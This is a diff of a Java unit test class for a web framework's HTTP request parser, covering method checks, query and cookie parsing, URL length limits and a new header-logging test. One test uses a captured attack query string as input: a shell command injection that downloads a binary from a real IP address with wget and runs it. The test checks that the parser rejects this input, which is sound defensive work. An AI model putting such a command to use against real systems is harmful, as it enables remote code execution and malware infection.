@@ -1,6 +1,7 @@
 package core.framework.internal.web.request;
 
 import core.framework.http.ContentType;
+import core.framework.internal.log.ActionLog;
 import core.framework.log.ErrorCode;
 import core.framework.util.Strings;
 import core.framework.web.exception.BadRequestException;
@@ -8,6 +9,7 @@ import core.framework.web.exception.MethodNotAllowedException;
 import io.undertow.server.HttpServerExchange;
 import io.undertow.server.ServerConnection;
 import io.undertow.server.handlers.CookieImpl;
+import io.undertow.util.HeaderMap;
 import io.undertow.util.Headers;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
@@ -61,8 +63,8 @@ class RequestParserTest {
     @Test
     void httpMethod() {
         assertThatThrownBy(() -> parser.httpMethod("TRACK"))
-            .isInstanceOf(MethodNotAllowedException.class)
-            .hasMessageContaining("method=TRACK");
+                .isInstanceOf(MethodNotAllowedException.class)
+                .hasMessageContaining("method=TRACK");
     }
 
     @Test
@@ -76,7 +78,7 @@ class RequestParserTest {
         var request = new RequestImpl(null, null);
         // undertow url decoding is disabled in core.framework.internal.web.HTTPServer.start, so the parser must decode all query param
         Map<String, Deque<String>> params = Map.of("key", new ArrayDeque<>(List.of(encode("value1 value2", UTF_8))),
-            "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
+                "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
         parser.parseQueryParams(request, params);
 
         assertThat(request.queryParams()).containsOnly(entry("key", "value1 value2"), entry("emptyKey", ""));
@@ -87,10 +89,10 @@ class RequestParserTest {
         var request = new RequestImpl(null, null);
 
         // the query string is from actual cases of production
-        Map<String, Deque<String>> params = Map.of("cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo", new ArrayDeque<>());
+        Map<String, Deque<String>> params = Map.of("cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo", new ArrayDeque<>(List.of("")));
         assertThatThrownBy(() -> parser.parseQueryParams(request, params))
-            .isInstanceOf(BadRequestException.class)
-            .hasMessageContaining("failed to parse query param");
+                .isInstanceOf(BadRequestException.class)
+                .hasMessageContaining("failed to parse query param");
     }
 
     @Test
@@ -112,8 +114,8 @@ class RequestParserTest {
         exchange.putAttachment(RequestBodyReader.REQUEST_BODY, new RequestBodyReader.RequestBody(null, new IOException()));
 
         assertThatThrownBy(() -> parser.parseBody(request, exchange))
-            .isInstanceOf(BadRequestException.class)
-            .satisfies(e -> assertThat(((ErrorCode) e).errorCode()).isEqualTo("FAILED_TO_READ_HTTP_REQUEST"));
+                .isInstanceOf(BadRequestException.class)
+                .satisfies(e -> assertThat(((ErrorCode) e).errorCode()).isEqualTo("FAILED_TO_READ_HTTP_REQUEST"));
     }
 
     @Test
@@ -127,7 +129,7 @@ class RequestParserTest {
         request.port = 443;
 
         assertThat(parser.requestURL(request, exchange))
-            .isEqualTo("https://localhost/path?key=value");
+                .isEqualTo("https://localhost/path?key=value");
     }
 
     @Test
@@ -137,16 +139,14 @@ class RequestParserTest {
         exchange.setRequestURI("/path");
 
         var builder = new StringBuilder(1000);
-        for (int i = 0; i < 100; i++) {
-            builder.append("1234567890");
-        }
+        builder.append("1234567890".repeat(100));
         exchange.setQueryString(builder.toString());
         RequestImpl request = new RequestImpl(exchange, null);
         request.scheme = "http";
         request.port = 80;
         assertThatThrownBy(() -> parser.requestURL(request, exchange))
-            .isInstanceOf(BadRequestException.class)
-            .hasMessageContaining("requestURL is too long");
+                .isInstanceOf(BadRequestException.class)
+                .hasMessageContaining("requestURL is too long");
     }
 
     @Test
@@ -163,12 +163,27 @@ class RequestParserTest {
         exchange.getRequestHeaders().put(Headers.COOKIE, "name=invalid-" + (char) 232);
 
         assertThatThrownBy(() -> parser.parseCookies(new RequestImpl(null, null), exchange))
-            .isInstanceOf(BadRequestException.class);
+                .isInstanceOf(BadRequestException.class);
     }
 
     @Test
     void decodeInvalidCookieValue() {
         Map<String, String> cookies = parser.decodeCookies(Map.of("name", new CookieImpl("name", "%%")));
         assertThat(cookies).isEmpty();
+    }
+
+    @Test
+    void logSiteHeaders() {
+        var headers = new HeaderMap();
+        headers.put(Headers.REFERER, "http://localhost");
+        headers.put(Headers.USER_AGENT, "Mozilla/5.0");
+        var actionLog = new ActionLog(null);
+
+        parser.logSiteHeaders(headers, actionLog);
+        assertThat(actionLog.context).doesNotContainKeys("user_agent", "referer");
+
+        parser.logSiteHeaders = true;
+        parser.logSiteHeaders(headers, actionLog);
+        assertThat(actionLog.context).containsKeys("user_agent", "referer");
     }
 }
